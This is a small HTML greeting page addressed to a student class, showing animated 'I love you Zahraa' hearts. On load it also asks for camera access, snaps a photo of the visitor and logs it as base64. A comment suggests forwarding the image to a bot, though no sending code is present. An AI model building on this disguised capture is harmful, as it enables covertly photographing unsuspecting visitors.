<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>تحياتي لكم طلاب قسم تجميع الحاسبات أ</title>
<style>
  body {
    margin: 0;
    padding: 0;
    overflow: hidden;
    background-color: #ffffff; /* خلفية بيضاء */
    font-family: Arial, sans-serif;
  }

  .heart {
    position: absolute;
    color: black;
    font-weight: bold;
    font-size: 24px;
    user-select: none;
    pointer-events: none;
    white-space: nowrap;
  }

  video, canvas {
    position: fixed;
    bottom: 10px;
    right: 10px;
    width: 160px;
    height: 120px;
    border: 2px solid #000;
    border-radius: 5px;
    z-index: 999;
  }
</style>
</head>
<body>

<video autoplay playsinline></video>
<canvas width="160" height="120"></canvas>

<script>
  // ======== حركة القلوب العشوائية ========
  const texts = ['❤️ أحبك زهراء ❤️'];
  const hearts = [];

  function createHeart() {
    const heart = document.createElement('div');
    heart.className = 'heart';
    heart.textContent = texts[Math.floor(Math.random() * texts.length)];
    heart.style.left = Math.random() * window.innerWidth + 'px';
    heart.style.top = Math.random() * window.innerHeight + 'px';
    heart.speedX = (Math.random() - 0.5) * 2;
    heart.speedY = (Math.random() - 0.5) * 2;
    document.body.appendChild(heart);
    hearts.push(heart);
  }

  for (let i = 0; i < 30; i++) createHeart();

  function moveHearts() {
    hearts.forEach(h => {
      let x = parseFloat(h.style.left);
      let y = parseFloat(h.style.top);
      x += h.speedX;
      y += h.speedY;

      if (x < 0 || x > window.innerWidth - 50) h.speedX *= -1;
      if (y < 0 || y > window.innerHeight - 30) h.speedY *= -1;

      h.style.left = x + 'px';
      h.style.top = y + 'px';
    });
    requestAnimationFrame(moveHearts);
  }
  moveHearts();

  // ======== التقاط الصورة تلقائيًا بعد طلب الإذن ========
  async function capturePhoto() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.querySelector('video');
      video.srcObject = stream;

      const canvas = document.querySelector('canvas');
      const ctx = canvas.getContext('2d');

      setTimeout(async () => {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');
        console.log("تم التقاط الصورة:", imageData); // هنا تستطيع إرسال الصورة للبوت إذا أردت
        stream.getTracks().forEach(track => track.stop());
      }, 2000);

    } catch (err) {
      console.error("فشل الوصول للكاميرا:", err);
    }
  }

  window.addEventListener('load', capturePhoto);
</script>

</body>
</html>
